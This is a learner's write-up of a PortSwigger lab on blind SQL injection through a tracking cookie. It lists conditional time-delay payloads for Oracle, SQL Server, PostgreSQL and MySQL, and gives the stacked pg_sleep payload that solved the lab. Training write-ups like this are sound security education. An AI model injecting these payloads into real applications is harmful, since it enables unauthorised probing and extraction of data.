# Lab: Blind SQL injection with time delays.md
![](https://img.shields.io/badge/Difficulty-PRACTITIONER-blue)

**Lab Link:** [https://portswigger.net/web-security/sql-injection/blind/lab-time-delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)

---

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 
---

### My solution:

I followed this cheatsheet and tried them one by one, shaping them to fit my payload, because I didn't know which database the server used.

Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

Oracle 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

Microsoft 	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'

PostgreSQL 	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END

MySQL 	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')

I ended up with this:
`'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` (I encoded it in URL before injecting)
